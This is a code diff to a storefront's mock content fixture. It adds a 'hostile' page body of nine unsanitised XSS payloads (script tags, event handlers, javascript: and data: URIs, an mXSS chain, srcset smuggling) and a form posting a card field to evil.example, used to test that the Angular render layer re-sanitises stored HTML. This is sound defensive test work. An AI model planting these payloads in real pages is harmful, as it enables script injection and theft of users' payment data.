@@ -2357,6 +2357,43 @@ const CONTENT_PAGE_BODIES = {
     seoDescription: 'How Colombo Wardrobe began, and what we make.',
   },
   contact: { bodyHtml: '', seoTitle: null, seoDescription: null },
+
+  /**
+   * **Nine raw, unsanitised payloads, served exactly as an attacker would have written them.**
+   *
+   * Everything else in this fixture is already-clean HTML, because the API cleans on save — which is
+   * right, and it means nothing in this repository ever exercised the storefront's *render* layer
+   * against hostile input. That layer exists on purpose: `IHtmlSanitiser`'s own remarks say the body is
+   * bound with `[innerHTML]` and never `bypassSecurityTrustHtml` precisely so that Angular's DOM
+   * sanitiser runs again, in the browser and during the server render, and holds for a row written by a
+   * support script, a data fix or a restore from a spreadsheet — none of which comes through the API.
+   * An untested second line of defence is a hope, not a line of defence. The W2-11 tester built this
+   * fixture's shape outside the repository and measured 0 of 9 rendering dangerously; this is it,
+   * inside the repository, so it keeps being measured.
+   *
+   * The payloads are the ones that distinguish a real sanitiser from a string replace: a plain script,
+   * an mXSS chain through foreign content, an event handler on an allowed element, both URI schemes
+   * that execute, an SVG with a scheduled handler, a comment that ends early, and `srcset` smuggled
+   * beside a `src`.
+   */
+  hostile: {
+    bodyHtml:
+      '<p>Before.</p>'
+      + '<script>window.__xss = (window.__xss ?? 0) + 1;</script>'
+      + '<img src="x" onerror="window.__xss = (window.__xss ?? 0) + 1">'
+      + '<svg><animate onbegin="window.__xss = (window.__xss ?? 0) + 1" attributeName="x" dur="1s">'
+      + '</animate></svg>'
+      + '<a href="javascript:window.__xss = (window.__xss ?? 0) + 1">Link</a>'
+      + '<iframe src="data:text/html,<script>parent.__xss = 1</script>"></iframe>'
+      + '<math><mtext><table><mglyph><style><img src=x onerror="window.__xss = 1">'
+      + '</style></mglyph></table></mtext></math>'
+      + '<!--><script>window.__xss = 1</script>-->'
+      + '<img src="/media/a.webp" srcset="javascript:window.__xss = 1" alt="A">'
+      + '<form action="https://evil.example/collect"><input name="card"></form>'
+      + '<p>After.</p>',
+    seoTitle: null,
+    seoDescription: null,
+  },
   returns: { bodyHtml: '<p>Thirty days.</p>', seoTitle: null, seoDescription: null },
   shipping: { bodyHtml: '<p>Island-wide.</p>', seoTitle: null, seoDescription: null },
   privacy: { bodyHtml: '<p>Placeholder for the PDPA review.</p>', seoTitle: null, seoDescription: null },
@@ -2375,6 +2412,12 @@ function contentPages() {
 
   if (contentPagesState === 'custom') {
     return [{ slug: 'size-guide', title: 'Size guide', systemKey: null, updatedAtUtc: null }];
+  }
+
+  // A page whose stored body never went through the sanitiser, which is the support-script case. See
+  // CONTENT_PAGE_BODIES.hostile.
+  if (contentPagesState === 'hostile') {
+    return [{ slug: 'hostile', title: 'Hostile body', systemKey: null, updatedAtUtc: null }];
   }
 
   return [];
